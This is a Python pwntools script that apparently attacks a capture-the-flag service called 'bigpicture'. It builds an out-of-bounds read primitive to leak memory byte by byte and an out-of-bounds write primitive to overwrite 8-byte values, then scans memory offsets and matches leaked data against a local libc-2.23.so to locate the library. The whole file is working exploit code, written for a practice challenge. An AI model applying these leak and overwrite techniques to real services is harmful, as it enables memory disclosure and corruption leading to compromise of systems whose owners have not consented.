from pwn import *


def new_process():
    global p
    p = remote('bigpicture.chal.pwning.xxx', 420)
    p.sendlineafter('How big? ', '100 x 5000')

new_process()


def read_result(offset):
    p.sendlineafter('> ', '{}, {}, {}'.format(0, offset, '_'))
    if p.recvn(2) != 'ov':
        raise Exception("Expectation Fail")
    p.recvuntil('erwriting ')
    readed = p.recvn(1)
    return ord(readed)


def leak(offset, byte):
    ret = 0
    t = 1
    for i in range(byte):
        ret += t * read_result(offset+i)
        t *= 256
    return ret


def overwrite(offset, value):
    s = p64(value)
    for i in range(len(s)):
        if s[i]:
            p.sendlineafter('> ', '{}, {}, {}'.format(0, offset+i, s[i]))

content = ''
with open('libc-2.23.so', 'rb') as libc_file:
    content += libc_file.read()

t = -1550000
while True:
    try:
        leaked = leak(t, 8)
        in_str = p64(leaked)
        find_helper = ''
        for b in in_str:
            find_helper += ' {:02x}'.format(ord(b))
        print('{}: {} / {:s}'.format(t, find_helper, in_str))
        if in_str in content:
            print("FOUND")
    except Exception:
        p.close()
        print('{}: Failed'.format(t))
        new_process()
    t -= 2000
